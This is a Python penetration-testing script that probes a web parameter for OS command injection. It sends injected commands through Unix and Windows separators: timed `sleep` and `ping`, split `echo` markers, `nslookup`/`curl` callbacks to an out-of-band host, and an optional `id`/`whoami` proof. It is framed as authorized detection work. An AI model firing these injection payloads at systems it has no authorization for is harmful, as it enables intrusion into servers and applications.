#!/usr/bin/env python3
"""cmdi_probe.py — owned OS command-injection DETECTION for pen_test.

Three independent, benign signals through the shared _httpcore engine so a
finding never rests on one ambiguous response — and each with the discipline to
not cry wolf:

  1. time-based   — a conditional `sleep N` measurably delays the response, and
     is confirmed to SCALE with N (T1 vs T2 vs a sleep-0 control) so a WAF
     tarpit or one-off jitter can't masquerade as execution.
  2. echo-eval    — the payload NEVER contains the contiguous marker; the shell
     must CONCATENATE/COMPUTE it (`echo A$(echo B)C`, arithmetic `$((4+4))`).
     Success = the *evaluated* marker present AND the raw payload absent — a
     reflection surface cannot produce that transformation.
  3. OOB          — with --oob-host, a `nslookup <tok>.<host>` / curl callback
     fires; near-zero false-positive for blind cases (you correlate the token
     out-of-band; the probe just plants it).

Covers Unix and Windows separators, quote-breakout, and `${IFS}` space-bypass.
NEVER runs a destructive command; the benign escalation proof is a read-only
`id`/`whoami`. Argument-injection (no shell) is reported as a distinct, lower
class. See knowledge/rce.md.

AUTHORIZATION: active traffic — authorized targets only.

Usage:
    python3 cmdi_probe.py -u "https://app/ping?host=127.0.0.1" --param host
    python3 cmdi_probe.py -u "https://app/api" -X POST --location json --param cmd \\
        --json '{"cmd":"x"}' --oob-host abc.oob.example --evidence-dir ./ev
"""

from __future__ import annotations

import argparse
import json as jsonlib
import random
import re
import statistics
import string

import _httpcore as core

TOK = "CMDI" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))

# Time-based payloads: (label, template with {s}). Highest-signal first.
TIME_PAYLOADS = [
    ("unix ;",        ";sleep {s};"),
    ("unix $()",      "$(sleep {s})"),
    ("unix backtick", "`sleep {s}`"),
    ("unix &&",       "&& sleep {s}"),
    ("unix |",        "| sleep {s}"),
    ("unix %0a",      "%0asleep {s}%0a"),
    ("unix quote'",   "';sleep {s};'"),
    ('unix quote"',   '";sleep {s};"'),
    ("unix ${IFS}",   ";sleep${{IFS}}{s};"),
    ("win &",         "& ping -n {sp1} 127.0.0.1 & rem"),
    ("win timeout",   "& timeout /t {s} & rem"),
]
# Echo-eval payloads: the marker is SPLIT so only real shell eval reconstructs it.
# {t} = token core; expected reconstructed = f"MK_{t}_END".
ECHO_PAYLOADS = [
    ("unix $() split", ";echo MK_$(echo {a})$(echo {b})_END;"),
    ("unix arith",     ";echo MK_{t}_$((4+4))END;"),           # expects ...8END, not ...4+4END
    ("unix backtick",  "`echo MK_{a}{b}_END`"),
    ("win concat",     "& (echo MK_&&echo {a}{b}&&echo _END) &"),
]
OOB_PAYLOADS = [
    ("nslookup", ";nslookup {tok}.{host};"),
    ("curl",     ";curl http://{tok}.{host}/;"),
    ("backtick", "`nslookup {tok}.{host}`"),
    ("win",      "& nslookup {tok}.{host} &"),
]
ESCALATE_UNIX = ";id;"
ESCALATE_WIN = "& whoami &"
ID_RX = re.compile(r"uid=\d+\(|gid=\d+\(|nt authority|[\\/]?[a-z]+\\[a-z]+", re.I)


def _spec(args) -> core.RequestSpec:
    base_json = jsonlib.loads(args.json) if args.json else None
    base_form = dict(core.parse_kv(args.data.split("&"), "=")) if args.data else {}
    return core.RequestSpec(method=args.method, url=args.url, param=args.param,
                            location=args.location, base_form=base_form, base_json=base_json)


def _send(client, spec, payload):
    return client.request(**spec.build(payload, prefix_base=True))


def _baseline(client, spec, n=6):
    samples = [_send(client, spec, "").elapsed for _ in range(n)]
    mean = statistics.mean(samples)
    stdev = statistics.pstdev(samples) or 0.05
    return mean, stdev


def time_based(client, spec, t1=5, t2=10) -> tuple[str, str] | None:
    print("\n[time-based] baseline then conditional sleep, with scaling confirmation...")
    mean, stdev = _baseline(client, spec)
    thr1 = mean + max(3 * stdev, t1 - 1.5)
    print(f"  baseline mean={mean:.2f}s stdev={stdev:.2f}s -> T1 threshold={thr1:.2f}s")
    for label, tpl in TIME_PAYLOADS:
        payload = tpl.format(s=t1, sp1=t1 + 1)
        r = _send(client, spec, payload)
        e1 = (t1 + client.timeout) if (not r.ok and r.error == "timeout") else r.elapsed
        if e1 < thr1:
            print(f"  {label:16s} T1 elapsed={e1:5.2f}s  no delay")
            continue
        # scaling check: T2 should be ~T1 longer; sleep-0 control should be near baseline
        r2 = _send(client, spec, tpl.format(s=t2, sp1=t2 + 1))
        e2 = (t2 + client.timeout) if (not r2.ok and r2.error == "timeout") else r2.elapsed
        r0 = _send(client, spec, tpl.format(s=0, sp1=1))
        e0 = r0.elapsed
        scales = (e2 - e1) >= (t2 - t1) * 0.6 and e0 < thr1
        verdict = "CONFIRMED (scales)" if scales else "tarpit/jitter (no scaling) — discarded"
        print(f"  {label:16s} T1={e1:.2f}s T2={e2:.2f}s T0={e0:.2f}s -> {verdict}")
        if scales:
            proof = (f"conditional sleep executed: T1(sleep {t1})={e1:.2f}s, "
                     f"T2(sleep {t2})={e2:.2f}s, T0(sleep 0)={e0:.2f}s, baseline={mean:.2f}s "
                     f"— delay scales linearly with the argument. Payload via {label}.")
            return payload, proof
    return None


def echo_eval(client, spec) -> tuple[str, str] | None:
    print("\n[echo-eval] split/computed marker (raw payload can't contain the answer)...")
    a, b = TOK[:4], TOK[4:]
    for label, tpl in ECHO_PAYLOADS:
        payload = tpl.format(a=a, b=b, t=TOK)
        r = _send(client, spec, payload)
        if not r.ok:
            continue
        # what real shell eval should reconstruct:
        if "arith" in label:
            expected = f"MK_{TOK}_8END"
        else:
            expected = f"MK_{a}{b}_END"
        got = expected in r.text
        reflected = payload in r.text  # raw payload echoed = reflection, not exec
        print(f"  {label:16s} expect {expected!r} -> {'FOUND' if got else 'absent'}"
              f"{' (but raw payload reflected)' if reflected else ''}")
        if got and not reflected:
            excerpt = r.text[max(0, r.text.find(expected) - 40):r.text.find(expected) + 60]
            proof = (f"shell reconstructed a split marker: sent {payload!r}, response contained the "
                     f"COMPUTED {expected!r} with the raw payload absent — proves execution, not reflection.")
            return payload, proof.replace("\n", " ")
    return None


def oob(client, spec, host) -> str | None:
    print(f"\n[oob] planting DNS/HTTP callbacks at *.{host} (correlate on your listener)...")
    for label, tpl in OOB_PAYLOADS:
        tok = TOK.lower() + label[:3]
        payload = tpl.format(tok=tok, host=host)
        _send(client, spec, payload)
        print(f"  planted {label}: {tok}.{host}")
    return (f"OOB callbacks planted at <token>.{host} for param {spec.param}; a hit on your "
            f"collaborator/interactsh listener confirms blind command execution.")


def escalate(client, spec) -> tuple[str, str] | None:
    print("\n[escalate] benign read-only proof (id/whoami)...")
    for payload in (ESCALATE_UNIX, ESCALATE_WIN):
        r = _send(client, spec, payload)
        if r.ok and ID_RX.search(r.text):
            m = ID_RX.search(r.text)
            excerpt = r.text[max(0, m.start() - 20):m.start() + 80].replace("\n", " ")
            print(f"  [!] command output captured: {excerpt.strip()[:80]}")
            return payload, excerpt
    print("  no id/whoami output reflected (blind context — rely on time/OOB proof).")
    return None


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--param", required=True)
    p.add_argument("--location", default="query", choices=core.LOCATIONS)
    p.add_argument("-X", "--method", default="GET")
    p.add_argument("--data")
    p.add_argument("--json")
    p.add_argument("--oob-host", help="collaborator/interactsh base domain for blind OOB")
    p.add_argument("--t1", type=int, default=5, help="short sleep for time-based (default 5s)")
    p.add_argument("--t2", type=int, default=10, help="long sleep for scaling check (default 10s)")
    p.add_argument("--escalate", action="store_true", help="capture benign id/whoami on confirm")
    core.add_common_args(p)
    core.add_evidence_args(p)
    args = p.parse_args()
    core.require_scheme(args.url)

    client = core.client_from_args(args)
    spec = _spec(args)
    ev = core.evidence_from_args(args)
    print(f"Target: {args.method} {args.url}  |  injecting `{args.param}` in {args.location}")

    signals: dict[str, tuple[str, str]] = {}
    t = time_based(client, spec, args.t1, args.t2)
    if t:
        signals["time-based"] = t
    e = echo_eval(client, spec)
    if e:
        signals["echo-eval"] = e
    oob_note = oob(client, spec, args.oob_host) if args.oob_host else None

    excerpt = ""
    esc_payload = ""
    if signals and args.escalate:
        esc = escalate(client, spec)
        if esc:
            esc_payload, excerpt = esc

    print("\n" + "=" * 60)
    if not signals and not oob_note:
        print("[-] No command-injection signal. (If separators are stripped but a fixed binary "
              "still receives your value as an argument, test argument-injection — a distinct class.)")
        return

    confirmed = bool(signals)
    proof_parts = [v[1] for v in signals.values()]
    if excerpt:
        proof_parts.append(f"benign proof (id/whoami): {excerpt.strip()[:120]}")
    proof = " || ".join(proof_parts) if proof_parts else ""
    print(f"[!] OS command injection via: {', '.join(signals) or '(OOB pending)'}")
    if oob_note:
        print(f"    {oob_note}")
    print("    Weaponization (reverse shell / webshell) is out of scope for this detector — "
          "run only under explicit exploitation authorization (knowledge/rce.md).")

    if ev:
        status = "confirmed" if confirmed else "candidate"
        repro = (f"python3 cmdi_probe.py -u '{args.url}' --param {args.param} "
                 f"--location {args.location} -X {args.method}"
                 + (f" --oob-host {args.oob_host}" if args.oob_host else "")
                 + (" --escalate" if args.escalate else ""))
        winning = (signals.get("echo-eval") or signals.get("time-based") or ("", ""))[0]
        f = core.Finding(
            vuln_class="cmdi", tool="cmdi_probe.py",
            title=f"OS command injection in {args.param}",
            severity="critical", target=args.url, status=status,
            param=args.param, location=args.location,
            proof=proof or (oob_note or ""),
            request=f"{args.method} {args.url}  [{args.location}:{args.param}] += {winning}",
            response_excerpt=excerpt, reproduce=repro,
            notes=(oob_note or "") + " Escalation to a shell intentionally not fired.")
        ev.add(f)
        print(f"[evidence] finding written to {ev.findings_path}")


if __name__ == "__main__":
    main()
